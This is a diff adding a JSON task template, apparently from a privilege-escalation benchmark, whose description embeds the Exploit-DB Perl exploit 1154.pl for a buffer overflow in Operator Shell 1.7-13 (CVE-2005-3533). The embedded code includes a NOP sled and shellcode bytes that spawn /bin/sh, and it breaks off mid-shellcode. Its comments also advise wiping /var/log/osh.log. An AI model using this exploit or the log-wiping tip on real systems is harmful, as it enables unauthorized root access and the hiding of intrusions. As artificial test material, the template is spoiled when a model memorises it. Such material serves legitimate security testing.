@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_1154",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Operator Shell (osh) 1.7-13 - Local Privilege Escalation (OSVDB-21576;CVE-2005-3533)\n\nExploit source code (1154.pl):\n```\n# You must be group(operator) for permissions /str0ke\n\n#!/usr/bin/perl\n#######################################################################\n#\n# OSH 1.7 Exploit #2 (Gonna bang away at this until it's removed ;-)\n#\n# EDUCATIONAL purposes only.... :-)\n#\n# by Charles Stevenson (core) <core@bokeoa.com>\n#\n# Description:\n# The Operator Shell (Osh) is a setuid root, security enhanced, restricted\n# shell. It allows the administrator to carefully limit the access of special\n# commands and files to the users whose duties require their use, while\n# at the same time automatically maintaining audit records. The configuration\n# file for Osh contains an administrator defined access profile for each\n# authorized user or group.\n#\n# Problem (discovered by Solar Eclipse):\n#\n# handlers.c:364\n#\n#    char temp3[255];\n#\n#    if (*file!='/') {\n#      getcwd(temp3, MAXPATHLEN);\n#      strcat(temp3,\"/\");\n#      strcat(temp3,file);\n#    }\n#\n#    ...\n#\n#    \"If the length of the current working directory plus the length of the\n#    file name is longer than 255 bytes, there will be a buffer overflow in\n#    temp3[]. The size limit of the current direcory is MAXPATHLEN, which is\n#    defined as 1024 on modern Linux systems. The limit for the file name is\n#    MAXFNAME, defined as 32 in struct.h:116.\"\n#\n#    \"This code is in the writable() function, which is called by the handlers\n#    for built-in cp, vi, rm and test commands, as well as the redirect\n#    function.\" -- Solar Eclipse\n#\n# Risk: Medium since user would have to be in the operator group which\n#       the admin would have to grant explicitly and I assume would be\n#       a trustworthy individual ;-)\n#\n# Solution:\n# apt-get --purge remove osh\n#\n# greetz to solar eclipse, nemo, andrewg, cnn, arcanum, mercy, amnesia,\n# banned-it, capsyl, sloth, redsand, KF, akt0r, MRX, salvia, truthix, ...\n#\n# irc.pulltheplug.org (#social)\n# 0dd: much <3 & respect\n#\n# 08/12/05 - PoC causes segv with 0x41414141 eip\n# 08/16/05 - PoC _exit(0) ... need shellcode to get past char filters\n# 08/16/04 - Later that night... or morning... ROOTSHELL!! Woot! PTP joint\n#            effort on the shellcode.\n#\n# I still find it hard to imagine that anyone would use osh\n# The code is basically beyond repair. Sudo is better.... :-)\n#\n# Don't forget to clean /var/log/osh.log\n#\n#######################################################################\n#               PRIVATE - DO NOT DISTRIBUTE - PRIVATE                 #\n#######################################################################\n\n\n# Yanked from one of KF's exploits.. werd brotha ;-) I'm lazy..\n$sc = \"\\x90\" x (511-45) .\n\n# 45 bytes by anthema. 0xff less\n\"\\x89\\xe6\" . # /* movl %esp, %esi */\n\"\\x83\\xc6\\x30\" . # /* addl $0x30, %esi */\n\"\\xb8\\x2e\\x62\\x69\\x6e\" . # /bin /* movl $0x6e69622e, %eax */\n\"\\x40\" . # /* incl %eax */\n\"\\x89\\x06\" . # /* movl %eax, (%esi) */\n\"\\xb8\\x2e\\x73\\x68\\x21\" . # /sh /* movl $0x2168732e, %eax */\n\"\\x40\" . # /* incl %eax */\n\"\\x89\\x46\\x04\" . # /* movl %eax, 0x04(%esi) */\n\"\\x2\n```",
+  "cve": "OSVDB-21576;CVE-2005-3533",
+  "exploitdb_id": "1154",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_1154",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
